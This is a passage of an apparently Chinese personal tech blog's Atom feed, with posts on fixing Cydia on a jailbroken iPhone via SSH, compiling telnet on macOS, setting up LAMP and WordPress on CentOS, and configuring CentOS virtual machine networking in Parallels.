使用网络并安装源</p></li><li><p>进入 <code>Cydia</code> ，添加威锋源( <a href="http://repo.feng.com" target="_blank" rel="noopener">http://repo.feng.com</a> )</p></li><li><p>搜索安装 <code>OpenSSH</code> 插件</p></li><li><p>使用PC或者Mac的ssh工具连接iPhone，默认 root 密码为<code>alpine</code></p></li><li><p>删除上述三个文件即可</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /var/preferences</span><br><span class="line">rm 三个文件</span><br></pre></td></tr></table></figure></li><li><p>别忘了修改 root 密码</p></li><li><p>此时关闭科学上网仍然可以使用 <code>Cydia</code> 了</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文介绍了当 iPhone 越狱后 Cydia 无法加载网络的解决办法&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>macOS 10.14.3 编译安装telnet工具</title>
    <link href="https://pwn4justice.github.io/2019/04/05/macOS-10-14-3-%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85telnet%E5%B7%A5%E5%85%B7/"/>
    <id>https://pwn4justice.github.io/2019/04/05/macOS-10-14-3-编译安装telnet工具/</id>
    <published>2019-04-05T14:48:54.000Z</published>
    <updated>2019-07-06T12:28:17.697Z</updated>
    
    <content type="html"><![CDATA[<p>本文简要介绍了如何在 macOS 上安装Telnet工具</p><a id="more"></a><h3 id="0x01-前提"><a href="#0x01-前提" class="headerlink" title="0x01 前提"></a>0x01 前提</h3><p>Homebrew 实在是太慢，可以考虑使用privoxy转发代理到terminal使用，但是太麻烦，反正源码也不大，直接使用源码编译安装此时是比较合适的。</p><h3 id="0x02-开始下载并安装"><a href="#0x02-开始下载并安装" class="headerlink" title="0x02 开始下载并安装"></a>0x02 开始下载并安装</h3><ol><li>创建临时目录并下载至此</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir inetutils</span><br><span class="line">$ <span class="built_in">cd</span> inetutils</span><br><span class="line">$ curl https://ftp.gnu.org/gnu/inetutils/inetutils-1.9.4.tar.xz -O</span><br><span class="line">$ tar -zxvf inetutils-1.9.4.tar.xz</span><br><span class="line">$ <span class="built_in">cd</span> inetutils-1.9.4</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/Users/user_name/inetutils/inetutils-1.9.4</span><br></pre></td></tr></table></figure><ol start="2"><li>配置并编译安装</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./configure --prefix=/usr/<span class="built_in">local</span> --<span class="built_in">disable</span>-servers \</span><br><span class="line">--<span class="built_in">disable</span>-hostname --<span class="built_in">disable</span>-ping --<span class="built_in">disable</span>-ping6 \</span><br><span class="line">--<span class="built_in">disable</span>-logger --<span class="built_in">disable</span>-talk --<span class="built_in">disable</span>-tftp \</span><br><span class="line">--<span class="built_in">disable</span>-whois --<span class="built_in">disable</span>-ifconfig --<span class="built_in">disable</span>-traceroute</span><br><span class="line"></span><br><span class="line">$ make -j8</span><br><span class="line"></span><br><span class="line">$ sudo make install</span><br><span class="line">...input your password...</span><br></pre></td></tr></table></figure><p>此时便可以使用Telnet了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文简要介绍了如何在 macOS 上安装Telnet工具&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux 内核代码风格规范</title>
    <link href="https://pwn4justice.github.io/2019/04/04/Linux-%E5%86%85%E6%A0%B8%E4%BB%A3%E7%A0%81%E9%A3%8E%E6%A0%BC%E8%A7%84%E8%8C%83/"/>
    <id>https://pwn4justice.github.io/2019/04/04/Linux-内核代码风格规范/</id>
    <published>2019-04-04T07:11:57.000Z</published>
    <updated>2019-07-06T12:32:29.772Z</updated>
    
    <content type="html"><![CDATA[<p>详情:<a href="https://www.kernel.org/doc/html/latest/translations/zh_CN/" target="_blank" rel="noopener">Linux 内核代码风格 - The Linux Kernel Documentation</a></p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">中文版维护者： 张乐 Zhang Le &lt;r0bertz@gentoo.org&gt;</span><br><span class="line">中文版翻译者： 张乐 Zhang Le &lt;r0bertz@gentoo.org&gt;</span><br><span class="line">中文版校译者： 王聪 Wang Cong &lt;xiyou.wangcong@gmail.com&gt;</span><br><span class="line">               wheelz &lt;kernel.zeng@gmail.com&gt;</span><br><span class="line">               管旭东 Xudong Guan &lt;xudong.guan@gmail.com&gt;</span><br><span class="line">               Li Zefan &lt;lizf@cn.fujitsu.com&gt;</span><br><span class="line">               Wang Chen &lt;wangchen@cn.fujitsu.com&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;详情:&lt;a href=&quot;https://www.kernel.org/doc/html/latest/translations/zh_CN/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Linux 内核代码风格 - The Linux Kernel Documentation&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LAMP环境与WordPress博客的搭建</title>
    <link href="https://pwn4justice.github.io/2019/03/20/LAMP%E7%8E%AF%E5%A2%83%E4%B8%8EWordPress%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>https://pwn4justice.github.io/2019/03/20/LAMP环境与WordPress博客的搭建/</id>
    <published>2019-03-20T09:01:11.000Z</published>
    <updated>2019-07-19T16:26:20.654Z</updated>
    
    <content type="html"><![CDATA[<p>本文阐述了如何在 LAMP 的环境下搭建一个 WordPress 博客。</p><a id="more"></a><h2 id="检查Apache"><a href="#检查Apache" class="headerlink" title="检查Apache"></a>检查Apache</h2><p><code>rpm -qa | grep httpd*</code></p><h2 id="检查PHP"><a href="#检查PHP" class="headerlink" title="检查PHP"></a>检查PHP</h2><p><code>rpm -qa | grep php*</code></p><h2 id="检查MySQL"><a href="#检查MySQL" class="headerlink" title="检查MySQL"></a>检查MySQL</h2><p><code>rpm -qa | grep mysql*</code><br><code>rpm -qa | grep mariadb*</code></p><p><em>如果有剩余版本：使用 <code>rpm -e --nodeps xxx</code> 一个个卸载即可</em></p><h2 id="安装准备工作"><a href="#安装准备工作" class="headerlink" title="安装准备工作"></a>安装准备工作</h2><p><strong>1. 关闭SELinux</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/selinux/config</span><br><span class="line"># SELINUX=enforcing# 添加注释</span><br><span class="line"># SELINUXTYPE=targeted</span><br><span class="line">SELINUX=disabled# 增加一行</span><br></pre></td></tr></table></figure><p>​    <strong>注：关闭SELINUX需要重启</strong></p><p><strong>2. 防火墙(iptables)</strong><br><strong>注：CentOS 7.0 minimal版本默认使用firewalld，可考虑更改为iptables</strong></p><p><a href="https://blog.csdn.net/yhblog/article/details/83931316" target="_blank" rel="noopener">参考：CentOS7（minimal版本）防火墙配置</a></p><p><strong>3. 配置防火墙，开启80，3306端口</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysconfig/iptables</span><br><span class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT</span><br><span class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT</span><br><span class="line">/etc/init.d/iptables restart</span><br></pre></td></tr></table></figure><p>如图：<br><img src="./iptables.jpg" alt="iptables"></p><h2 id="安装Apache"><a href="#安装Apache" class="headerlink" title="安装Apache"></a>安装Apache</h2><p><strong>1. 具体步骤</strong><br><code>yum install httpd* -y</code><br>完成后，编辑httpd.conf文件(在/etc/httpd/conf/httpd.conf下)<br><code>vi /etc/httpd/conf/httpd.conf</code></p><p>找到 #ServerName <a href="http://www.example.com:80" target="_blank" rel="noopener">www.example.com:80</a> 修改为  ServerName localhost:80 ，或者设置为你自己的域名</p><p>启动 <code>/etc/init.d/httpd start</code> 这里我遇到一个问题 <code>-bash: /etc/init.d/httpd: No such file or directory</code>解决办法，先使用which查看httpd在哪: <code>which httpd</code> 发现在 <code>/usr/sbin/httpd</code> 目录下，故应该使用 <code>/usr/sbin/httpd start</code> 来启动，当然也可以直接使用 <code>systemctl start httpd.service</code>来启动</p><p><strong>2. apache设置开机启动</strong><br>启动服务：<code>systemctl start httpd</code><br>开机启动：<code>systemctl enable httpd</code></p><p><strong>3. 查看服务状态</strong><br><code>systemctl status httpd</code><br>如图：<br><img src="./httpd.jpg" alt="httpd成功状态"></p><h2 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h2><p><strong>1. 具体步骤</strong><br><code>yum install mariadb mariadb-server mariadb-libs mariadb-devel</code></p><p><strong>2. 查看安装状态</strong><br><code>rpm -qa |grep maria</code></p><p><strong>3. 设置开机启动</strong><br>启动服务：<code>systemctl start  mariadb</code><br>开机启动：<code>systemctl enable  mariadb</code></p><p><strong>4. 数据库安全设置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">[root@nmserver-7 ~]# mysql_secure_installation </span><br><span class="line"></span><br><span class="line">NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB</span><br><span class="line">      SERVERS IN PRODUCTION USE!  PLEASE READ EACH STEP CAREFULLY!</span><br><span class="line"></span><br><span class="line">In order to log into MariaDB to secure it, we&apos;ll need the current</span><br><span class="line">password for the root user.  If you&apos;ve just installed MariaDB, and</span><br><span class="line">you haven&apos;t set the root password yet, the password will be blank,</span><br><span class="line">so you should just press enter here.</span><br><span class="line"></span><br><span class="line">Enter current password for root (enter for none): </span><br><span class="line">OK, successfully used password, moving on...</span><br><span class="line"></span><br><span class="line">Setting the root password ensures that nobody can log into the MariaDB</span><br><span class="line">root user without the proper authorisation.</span><br><span class="line"></span><br><span class="line">Set root password? [Y/n] y</span><br><span class="line">New password: </span><br><span class="line">Re-enter new password: </span><br><span class="line">Password updated successfully!</span><br><span class="line">Reloading privilege tables..</span><br><span class="line"> ... Success!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">By default, a MariaDB installation has an anonymous user, allowing anyone</span><br><span class="line">to log into MariaDB without having to have a user account created for</span><br><span class="line">them.  This is intended only for testing, and to make the installation</span><br><span class="line">go a bit smoother.  You should remove them before moving into a</span><br><span class="line">production environment.</span><br><span class="line"></span><br><span class="line">Remove anonymous users? [Y/n] y</span><br><span class="line"> ... Success!</span><br><span class="line"></span><br><span class="line">Normally, root should only be allowed to connect from &apos;localhost&apos;.  This</span><br><span class="line">ensures that someone cannot guess at the root password from the network.</span><br><span class="line"></span><br><span class="line">Disallow root login remotely? [Y/n] n</span><br><span class="line"> ... skipping.</span><br><span class="line"></span><br><span class="line">By default, MariaDB comes with a database named &apos;test&apos; that anyone can</span><br><span class="line">access.  This is also intended only for testing, and should be removed</span><br><span class="line">before moving into a production environment.</span><br><span class="line"></span><br><span class="line">Remove test database and access to it? [Y/n] y</span><br><span class="line"> - Dropping test database...</span><br><span class="line"> ... Success!</span><br><span class="line"> - Removing privileges on test database...</span><br><span class="line"> ... Success!</span><br><span class="line"></span><br><span class="line">Reloading the privilege tables will ensure that all changes made so far</span><br><span class="line">will take effect immediately.</span><br><span class="line"></span><br><span class="line">Reload privilege tables now? [Y/n] y</span><br><span class="line"> ... Success!</span><br><span class="line"></span><br><span class="line">Cleaning up...</span><br><span class="line"></span><br><span class="line">All done!  If you&apos;ve completed all of the above steps, your MariaDB</span><br><span class="line">installation should now be secure.</span><br><span class="line"></span><br><span class="line">Thanks for using MariaDB!</span><br></pre></td></tr></table></figure><p><strong>5. 查看状态</strong><br><code>systemctl status  mariadb</code><br>图片：<br><img src="./mysql.jpg" alt="mysql"></p><p><strong>6. 出现的问题</strong></p><p>我在安装完mariaDB后，使用mysql 或者 mysql -uroot -p 或者mysqladmin -uroot password ‘newpassword’ 等都无法进入mysql，出现错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: NO)</span><br><span class="line">或者</span><br><span class="line">ERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: YES)</span><br></pre></td></tr></table></figure><p>为什么出现这种情况？</p><p>1.可能是旧版的没卸载干净，试试旧版的密码<br>2.另一种可选的解决方案：<a href="https://blog.csdn.net/geoffreychan/article/details/78076966" target="_blank" rel="noopener">Centos7 MariaDB root账户密码重置</a></p><h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p><strong>1. 具体步骤</strong><br><code>yum -y install php</code><br><strong>2. 关联php与mysql</strong><br><code>yum install php-mysql</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rpm -ql php-mysql</span><br><span class="line">/etc/php.d/mysql.ini</span><br><span class="line">/etc/php.d/mysqli.ini</span><br><span class="line">/etc/php.d/pdo_mysql.ini</span><br><span class="line">/usr/lib/php/modules/mysql.so</span><br><span class="line">/usr/lib/php/modules/mysqli.so</span><br><span class="line">/usr/lib/php/modules/pdo_mysql.so</span><br></pre></td></tr></table></figure><p><strong>3. 安装常用PHP模块</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y php-gd php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-snmp php-soap curl curl-devel php-bcmath</span><br></pre></td></tr></table></figure><p><strong>4. 测试</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ cd /var/www/html</span><br><span class="line">$ ls</span><br><span class="line">$ pwd</span><br><span class="line">/var/www/html</span><br><span class="line">$ vi info.php</span><br><span class="line">&lt;?php</span><br><span class="line">        phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">:wq</span><br></pre></td></tr></table></figure><p>在浏览器打开: IP:PORT/info.php [此处IP是你虚拟机的IP或者localhost，端口若为默认的80，可不写]<br>看到如下则LAMP环境搭建完成：<br><img src="./lamp.jpg" alt="lamp"></p><h2 id="下载并安装WordPress"><a href="#下载并安装WordPress" class="headerlink" title="下载并安装WordPress"></a>下载并安装WordPress</h2><p><strong>1. 下载</strong><br>    我想把它下载到<code>/tmp</code>目录，因为这个目录时临时的，且我们一旦安装完WordPress，安装包就没用了<br>    执行如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget "https://cn.wordpress.org/latest-zh_CN.tar.gz"</span><br></pre></td></tr></table></figure><p><strong>2. 安装</strong><br>    a) 先解压至<code>/var/www/html</code>这个网页根目录<br>    <code>tar xvf latest-zh_CN.tar.gz -C /var/www/html</code><br>    b) 此时目录结构为<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line">\</span><br><span class="line"> |index.html</span><br><span class="line"> |wordpress</span><br><span class="line">  \</span><br><span class="line"> wordpress网站的php文件</span><br></pre></td></tr></table></figure></p><p>c) 故需要将 /var/www/html/wordpress/ 下的所有文件都复制到 /var/www/html 下，并删除空的wordpress/文件<br><code>cp -r /var/www/html/wordpress/* /var/www/html/ &amp;&amp; rm -rf /var/www/html/wordpress</code></p><p><strong>3. 配置数据库</strong><br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u adminusername -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 5340 to server version: 3.23.54</span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the buffer.</span><br><span class="line">mysql&gt; CREATE DATABASE databasename;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">mysql&gt; GRANT ALL PRIVILEGES ON databasename.* TO &quot;wordpressusername&quot;@&quot;hostname&quot;</span><br><span class="line">   -&gt; IDENTIFIED BY &quot;password&quot;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line">mysql&gt; EXIT</span><br><span class="line">Bye</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><p><strong>4. 初始化-配置wp-config.php文件</strong><br>    a) 将html/目录下的 <code>wp-config-sample.php</code> 重命名为 <code>wp-config.php</code><br>    <code>mv wp-config-sample.php wp-config.php</code><br>    b) 找到如下选项，并配置成刚才上面设置的数据库名和用户密码<br>    <img src="./database.jpg" alt="database_options"><br>    如图所示：[乱码是正常的，忽视即可！]<br>    <img src="./db_final.jpg" alt="db_final"></p><p><strong>5. 运行安装脚本</strong><br>    将WordPress文件放在根目录下的用户请访问：<a href="http://yourip:port/wp-admin/install.php" target="_blank" rel="noopener">http://yourip:port/wp-admin/install.php</a><br>    我虚拟机的IP是 10.211.55.13 故访问 <a href="http://10.211.55.13/wp-admin/install.php" target="_blank" rel="noopener">http://10.211.55.13/wp-admin/install.php</a><br>    填写基本信息：<br>    <img src="./info.jpg" alt="info"><br>    点击<code>安装Wordpress</code><br>    <img src="./login.jpg" alt="login"><br>    点击<code>登录</code>，进入后台<br>    <img src="./admin.jpg" alt="admin"></p><p><strong>6. 完成效果</strong><br>    <img src="./finish.jpg" alt="finish"></p><center> --------------------- 至此安装完成 ------------------------</center>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文阐述了如何在 LAMP 的环境下搭建一个 WordPress 博客。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CentOS 在 Parallels Desktops 中网络配置的三种模式</title>
    <link href="https://pwn4justice.github.io/2019/03/19/CentOS-%E5%9C%A8-Parallels-Desktops-%E4%B8%AD%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E7%9A%84%E4%B8%89%E7%A7%8D%E6%A8%A1%E5%BC%8F/"/>
    <id>https://pwn4justice.github.io/2019/03/19/CentOS-在-Parallels-Desktops-中网络配置的三种模式/</id>
    <published>2019-03-19T14:25:07.000Z</published>
    <updated>2019-07-06T12:29:11.856Z</updated>
    
    <content type="html"><![CDATA[<p>本文简要介绍了如何在 Parallels Desktops 中配置 CentOS 虚拟机的网络</p><a id="more"></a><h2 id="三种模式简介："><a href="#三种模式简介：" class="headerlink" title="三种模式简介："></a>三种模式简介：</h2><ol><li>NAT (Shared Network)</li><li>Host-Only Network</li><li>Bridged Network</li></ol><br><h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><ul><li>操作系统：macOS Mojave </li><li>虚拟机：Parallels Desktop</li><li>软件版本：CentOS 7.0 minimal</li></ul><br><h2 id="使用NAT模式"><a href="#使用NAT模式" class="headerlink" title="使用NAT模式"></a>使用NAT模式</h2><p>使用NAT模式时，可以选择使用某个虚拟网卡，<br>此时需要知道该网卡的网关，可在主机中使用<br>ifconfig命令查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ifconfig 得到虚拟网卡地址：</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">inet 10.211.55.2 netmask 0xffffff00 broadcast 10.211.55.255</span><br><span class="line">------------------------------------------------------------</span><br></pre></td></tr></table></figure><p><img src="./nat.jpg" alt="nat"></p><p>在Source选项中选择 Shared Network，如上图，<br>编辑 /etc/sysconfig/network-scripts/ifcfg-eth0 配置文件[一般格式 ifcfg-xxx]:</p><ul><li><p>自动分配IP：[这样配置不用管上面得到的网卡地址]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Generated by parse-kickstart</span><br><span class="line">DEVICE=&quot;eth0&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">BOOTPROTO=&quot;dhcp&quot;</span><br><span class="line">UUID=&quot;afa8f527-af4c-4a93-bc1b-3ebc7f49816c&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br></pre></td></tr></table></figure></li><li><p>使用静态IP：[必须按照虚拟网卡地址的网段配置]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Generated by parse-kickstart</span><br><span class="line">DEVICE=&quot;eth0&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line">IPADDR=&quot;10.211.55.100&quot;      &lt;------- 注意IP</span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;</span><br><span class="line">GATEWAY=&quot;10.211.55.1&quot;       &lt;------- 网关地址，部分软件使用xx.xx.xx.2作为网关地址</span><br><span class="line">UUID=&quot;afa8f527-af4c-4a93-bc1b-3ebc7f49816c&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br></pre></td></tr></table></figure></li><li><p>配置完成后：重启网络并测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ service network restart</span><br><span class="line">$ ping baidu.com -c 4         ----&gt; 若成功，则实验完成</span><br></pre></td></tr></table></figure></li><li><p>若没有测试成功，检查虚拟机与主机的连接状态，酌情处理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ping host_ip</span><br><span class="line">以及从主机ping虚拟机</span><br></pre></td></tr></table></figure></li></ul><br><h2 id="使用桥接模式"><a href="#使用桥接模式" class="headerlink" title="使用桥接模式"></a>使用桥接模式</h2><p>使用桥接模式时：PD的设置如图(此时我需要桥接到wifi网卡上，因为我是连的wifi)</p><p><img src="./bridge.jpg" alt="bridge"></p><p> 查看主机ip：<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inet 192.168.199.133 netmask 0xffffff00 broadcast 192.168.199.255</span><br></pre></td></tr></table></figure></p><ul><li>使用静态IP：[必须上面主机ip属于同一网段]<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Generated by parse-kickstart</span><br><span class="line">DEVICE=&quot;eth0&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line">IPADDR=&quot;192.168.199.200&quot;        &lt;------- 注意IP</span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;</span><br><span class="line">GATEWAY=&quot;192.168.199.1&quot;         &lt;------- 网关地址，参考主机的网关地址</span><br><span class="line">UUID=&quot;afa8f527-af4c-4a93-bc1b-3ebc7f49816c&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br></pre></td></tr></table></figure></li></ul><p>遇到问题：ping qq.com or ping baidu.com 不成功! <br>查看DNS解析:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf 发现为空</span><br><span class="line">在该配置文件中加入:</span><br><span class="line">nameserver 192.168.199.1        &lt;----- 这也是主机的dns服务器</span><br></pre></td></tr></table></figure><p>重启网络，测试成功</p><ul><li>自动分配IP：[超级省事，一配一个准]<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Generated by parse-kickstart</span><br><span class="line">DEVICE=&quot;eth0&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">BOOTPROTO=&quot;dhcp&quot;</span><br><span class="line">UUID=&quot;afa8f527-af4c-4a93-bc1b-3ebc7f49816c&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br></pre></td></tr></table></figure></li></ul><br><h2 id="使用仅主机模式"><a href="#使用仅主机模式" class="headerlink" title="使用仅主机模式"></a>使用仅主机模式</h2><p><img src="./host-only.jpg" alt="host-only"></p><ul><li>略。用处不多。</li></ul><br>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文简要介绍了如何在 Parallels Desktops 中配置 CentOS 虚拟机的网络&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
